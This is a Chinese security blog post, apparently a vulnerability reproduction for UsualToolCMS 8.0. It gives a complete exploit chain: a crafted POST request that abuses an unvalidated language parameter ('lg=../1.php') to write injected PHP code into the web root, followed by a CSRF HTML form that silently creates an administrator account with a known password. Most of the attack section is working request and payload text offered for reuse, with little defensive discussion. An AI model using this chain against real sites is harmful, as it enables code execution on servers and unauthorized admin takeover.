<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="UsualToolcms 8.0 后台GETSHELL一、漏洞简介二、漏洞影响UsualToolCMS-8.0-Release 三、复现过程洞点:http:&#x2F;&#x2F;0-sec.org&#x2F;cmsadmin&#x2F;a_lang.php 13行未对$lg做判断">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0GETSHELL/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="UsualToolcms 8.0 后台GETSHELL一、漏洞简介二、漏洞影响UsualToolCMS-8.0-Release 三、复现过程洞点:http:&#x2F;&#x2F;0-sec.org&#x2F;cmsadmin&#x2F;a_lang.php 13行未对$lg做判断">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId32.shtml">
<meta property="article:published_time" content="2022-07-08T06:26:06.214Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-UsualToolcms/UsualToolcms 8.0 后台GETSHELL" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0GETSHELL/" class="article-date">
  <time datetime="2022-07-08T06:26:06.214Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="UsualToolcms-8-0-后台GETSHELL"><a href="#UsualToolcms-8-0-后台GETSHELL" class="headerlink" title="UsualToolcms 8.0 后台GETSHELL"></a>UsualToolcms 8.0 后台GETSHELL</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>UsualToolCMS-8.0-Release</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>洞点:<a target="_blank" rel="noopener" href="http://0-sec.org/cmsadmin/a_lang.php">http://0-sec.org/cmsadmin/a_lang.php</a></p>
<p>13行未对$lg做判断</p>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId25.png"></p>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId26.png"></p>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId27.png"></p>
<p>点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post<br>参数的en后面加入</p>
<pre><code>en&quot;&#125;,&lt;?php phpinfo(); ?&gt;
</code></pre>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId28.png"></p>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId29.png"></p>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId30.png"></p>
<pre><code>POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&amp;lg=../1.php HTTP/1.1
Host: 0-sec.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json
Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo
X-Forwarded-For: 8.8.8.8
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9189

submit=保存语言包&amp;keys[]=language&amp;values[]=en&quot;&#125;,&lt;?php phpinfo(); ?&gt;&amp;keys[]=charset&amp;values[]=utf-8&amp;keys[]=speak&amp;values[]=English&amp;keys[]=web&amp;values[]=UsualToolCMS&amp;key[]=index&amp;value[]=Home&amp;key[]=article&amp;value[]=Article&amp;key[]=product&amp;value[]=Product&amp;key[]=picture&amp;value[]=Picture&amp;key[]=atlas&amp;value[]=Atlas&amp;key[]=contact&amp;value[]=Contact&amp;key[]=about&amp;value[]=About&amp;key[]=forum&amp;value[]=Forum&amp;key[]=register&amp;value[]=Register&amp;key[]=login&amp;value[]=Login&amp;key[]=news&amp;value[]=News&amp;key[]=job&amp;value[]=Job&amp;key[]=wages&amp;value[]=Wages&amp;key[]=application&amp;value[]=Application&amp;key[]=resume&amp;value[]=Resume&amp;key[]=shopcart&amp;value[]=Shopcart&amp;key[]=account&amp;value[]=Account&amp;key[]=member&amp;value[]=Member&amp;key[]=up&amp;value[]=Up&amp;key[]=down&amp;value[]=Down&amp;key[]=more&amp;value[]=More&amp;key[]=new&amp;value[]=New&amp;key[]=authorize&amp;value[]=Authorize&amp;key[]=authenticating&amp;value[]=Authenticating&amp;key[]=qq&amp;value[]=QQ&amp;key[]=membercenter&amp;value[]=Member&amp;key[]=username&amp;value[]=Username&amp;key[]=password&amp;value[]=Password&amp;key[]=forgotpass&amp;value[]=Forgot&amp;key[]=search&amp;value[]=Search&amp;key[]=detail&amp;value[]=Detail&amp;key[]=size&amp;value[]=Size&amp;key[]=spec&amp;value[]=Spec&amp;key[]=color&amp;value[]=Color&amp;key[]=aboutus&amp;value[]=About Us&amp;key[]=newgoods&amp;value[]=New Product&amp;key[]=topgoods&amp;value[]=Top Product&amp;key[]=link&amp;value[]=Link&amp;key[]=confirm&amp;value[]=Confirm&amp;key[]=email&amp;value[]=Email&amp;key[]=title&amp;value[]=Title&amp;key[]=content&amp;value[]=Content&amp;key[]=avatar&amp;value[]=Avatar&amp;key[]=sex&amp;value[]=Sex&amp;key[]=man&amp;value[]=Man&amp;key[]=woman&amp;value[]=Woman&amp;key[]=address&amp;value[]=ADD.&amp;key[]=tel&amp;value[]=Tel&amp;key[]=fax&amp;value[]=Fax&amp;key[]=introduction&amp;value[]=Intro&amp;key[]=validatecode&amp;value[]=Captcha&amp;key[]=changeit&amp;value[]=Change it&amp;key[]=order&amp;value[]=Order&amp;key[]=writeorder&amp;value[]=Write Order&amp;key[]=menu&amp;value[]=Menu&amp;key[]=balance&amp;value[]=Balance&amp;key[]=level&amp;value[]=Level&amp;key[]=writearticles&amp;value[]=Write Articles&amp;key[]=articlemanagement&amp;value[]=Article Admin&amp;key[]=articlebrowse&amp;value[]=Article Browse&amp;key[]=writeonline&amp;value[]=Add New&amp;key[]=payment&amp;value[]=Payment&amp;key[]=registrationtime&amp;value[]=Reg Time&amp;key[]=lastlogintime&amp;value[]=Last Login&amp;key[]=fullname&amp;value[]=Full Name&amp;key[]=privileges:discount&amp;value[]=Privileges:Discount&amp;key[]=state&amp;value[]=State&amp;key[]=source&amp;value[]=Source&amp;key[]=ordernumber&amp;value[]=Order No.&amp;key[]=money&amp;value[]=Money&amp;key[]=time&amp;value[]=Time&amp;key[]=finish&amp;value[]=Finish&amp;key[]=unpaid&amp;value[]=Unpaid&amp;key[]=deliver&amp;value[]=Deliver&amp;key[]=refund&amp;value[]=Refund&amp;key[]=goods&amp;value[]=Goods&amp;key[]=charge&amp;value[]=Charge&amp;key[]=other&amp;value[]=Other&amp;key[]=ordertime&amp;value[]=Order Time&amp;key[]=voucher&amp;value[]=Voucher&amp;key[]=customer&amp;value[]=Customer&amp;key[]=zipcode&amp;value[]=Zip Code&amp;key[]=logistics&amp;value[]=Logistics&amp;key[]=logisticscompany&amp;value[]=Company&amp;key[]=logisticsnumber&amp;value[]=Number&amp;key[]=logisticsdetails&amp;value[]=Details&amp;key[]=paymentmethod&amp;value[]=Method&amp;key[]=alipay&amp;value[]=Alipay&amp;key[]=wechatpay&amp;value[]=Tencent Wechat&amp;key[]=paypal&amp;value[]=Paypal&amp;key[]=waitinganswer&amp;value[]=Waiting&amp;key[]=answered&amp;value[]=Answered&amp;key[]=question&amp;value[]=Question&amp;key[]=reply&amp;value[]=Reply&amp;key[]=tencentaccount&amp;value[]=Tencent&amp;key[]=weiboaccount&amp;value[]=Weibo&amp;key[]=wechataccount&amp;value[]=Wechat&amp;key[]=binded&amp;value[]=Binded&amp;key[]=untie&amp;value[]=Untie&amp;key[]=quantity&amp;value[]=Qty&amp;key[]=parameter&amp;value[]=Parm&amp;key[]=total&amp;value[]=Total&amp;key[]=submit&amp;value[]=Submit&amp;key[]=delete&amp;value[]=Del&amp;key[]=unit&amp;value[]=USD&amp;key[]=actual&amp;value[]=Actual&amp;key[]=feedback&amp;value[]=Feedback&amp;key[]=otheraccount&amp;value[]=Other Accounts&amp;key[]=out&amp;value[]=Out&amp;key[]=ranking&amp;value[]=Ranking&amp;key[]=recommend&amp;value[]=Recommend&amp;key[]=tag&amp;value[]=Tag&amp;key[]=tags&amp;value[]=Tags&amp;key[]=read&amp;value[]=Read&amp;key[]=productdetails&amp;value[]=Product Details&amp;key[]=service&amp;value[]=Service&amp;key[]=category&amp;value[]=Category&amp;key[]=allcategory&amp;value[]=All Category&amp;key[]=stock&amp;value[]=Stock&amp;key[]=price&amp;value[]=Price&amp;key[]=sale&amp;value[]=Sale&amp;key[]=loginview&amp;value[]=Login View&amp;key[]=readme&amp;value[]=Read Me&amp;key[]=popularity&amp;value[]=Popularity&amp;key[]=details&amp;value[]=Details&amp;key[]=message&amp;value[]=Message&amp;key[]=original&amp;value[]=Original&amp;key[]=author&amp;value[]=Author&amp;key[]=pass&amp;value[]=Pass&amp;key[]=audit&amp;value[]=Audit&amp;key[]=return&amp;value[]=Return&amp;key[]=yes&amp;value[]=Yes&amp;key[]=no&amp;value[]=No&amp;key[]=modify&amp;value[]=Modify&amp;key[]=articlemodify&amp;value[]=Article Modify&amp;key[]=type&amp;value[]=Type&amp;key[]=moreupload&amp;value[]=Up to upload&amp;key[]=success&amp;value[]=Success&amp;key[]=fail&amp;value[]=Fail&amp;key[]=upload&amp;value[]=Upload&amp;key[]=uploadtime&amp;value[]=Upload Time&amp;key[]=contactus&amp;value[]=Contact Us&amp;key[]=previouspage&amp;value[]=Prev&amp;key[]=nextpage&amp;value[]=Next&amp;key[]=firstpage&amp;value[]=First&amp;key[]=lastpage&amp;value[]=Last&amp;key[]=totalpage&amp;value[]=Total&amp;key[]=currentpage&amp;value[]=Current&amp;key[]=buy&amp;value[]=Buy&amp;key[]=mailverify&amp;value[]=Email validation&amp;key[]=welcome&amp;value[]=Welcome&amp;key[]=close&amp;value[]=closed&amp;key[]=findpassword&amp;value[]=Find Password&amp;key[]=contactmanager&amp;value[]=Contact Manager&amp;key[]=orderdetaillogin&amp;value[]=For order details,please visit the website.&amp;key[]=enterusername&amp;value[]=Please enter username!&amp;key[]=enterpassword&amp;value[]=Please enter password!&amp;key[]=enteremail&amp;value[]=Please enter Email!&amp;key[]=emailerr&amp;value[]=Email error!&amp;key[]=entertitle&amp;value[]=Please enter title!&amp;key[]=entercontent&amp;value[]=Please enter content!&amp;key[]=selecttype&amp;value[]=Type must be selected!&amp;key[]=enterauthor&amp;value[]=Please enter author!&amp;key[]=enterpasswords&amp;value[]=Please confirm the password!&amp;key[]=passworderr&amp;value[]=The codes don&amp;key[]=entercaptcha&amp;value[]=Please enter captcha!&amp;key[]=captchaerr&amp;value[]=Captcha error!&amp;key[]=mailsenderr&amp;value[]=Mail not sent!&amp;key[]=mailok&amp;value[]=Please check email!&amp;key[]=pleasemailverify&amp;value[]=Please check email for verification!&amp;key[]=mailverifycode&amp;value[]=Email Authentication Code&amp;key[]=mailcopylink&amp;value[]=Please copy the following link&amp;key[]=totalnum&amp;value[]=Total Num&amp;key[]=updateok&amp;value[]=Update successed!&amp;key[]=updateno&amp;value[]=Failed to update!&amp;key[]=payok&amp;value[]=Successful payment!&amp;key[]=payno&amp;value[]=Payment Failed!&amp;key[]=createempty&amp;value[]=Required field is empty!&amp;key[]=createok&amp;value[]=Create successed!&amp;key[]=createno&amp;value[]=Failed to create!&amp;key[]=gotopay&amp;value[]=Go to pay!&amp;key[]=untieok&amp;value[]=Untie successed!&amp;key[]=untieno&amp;value[]=Untie failed!&amp;key[]=delok&amp;value[]=Delete successed!&amp;key[]=delno&amp;value[]=Delete failed!&amp;key[]=regclose&amp;value[]=Website registration closed!&amp;key[]=regmailerr&amp;value[]=Account or email registered!&amp;key[]=loginusererr&amp;value[]=Account does not exist!&amp;key[]=loginpasserr&amp;value[]=Account or password does not match!&amp;key[]=administratorreply&amp;value[]=The administrator has not responded, please wait patiently.&amp;key[]=noscript&amp;value[]=Sorry, your browser disabled JavaScript, it may not be able to use some of the site&amp;key[]=readmecontent&amp;value[]=We guarantee that the outer packing of the goods is in good condition at the time of shipment. When you receive the goods, please carefully check whether the invoice and the goods are consistent with the delivery order. If you find that the goods are missing or damaged, please contact our customer service department on the spot when the delivery personnel are still on the scene; If you find that the package is damaged or the goods are damaged in transit, please point out and refuse to accept it on the spot. After refusal, please call our customer service. If you have signed for it or someone else has signed for it, you will be considered as the packaging, quantity and content of the goods. I will not be able to accept.&amp;key[]=copyright&amp;value[]=Copyright&amp;key[]=cssdisplay&amp;value[]=none&amp;key[]=test&amp;value[]=Test
请将上面post数据包内容进行url编码
</code></pre>
<h3 id="csrf配合上面的后台getshell"><a href="#csrf配合上面的后台getshell" class="headerlink" title="csrf配合上面的后台getshell"></a>csrf配合上面的后台getshell</h3><pre><code>&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
  &lt;form action=&quot;http://0-sec.org/cmsadmin/a_adminx.php?x=a&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;safetest&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;roleid&quot; value=&quot;1&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;123456&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;confirm&quot; value=&quot;123456&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;æ&amp;#143;&amp;#144;äº&amp;#164;&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId32.shtml"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0GETSHELL/" data-id="cl5c2qxdo00k1y8v1c0fohscl" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%89%8D%E5%8F%B0sql/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>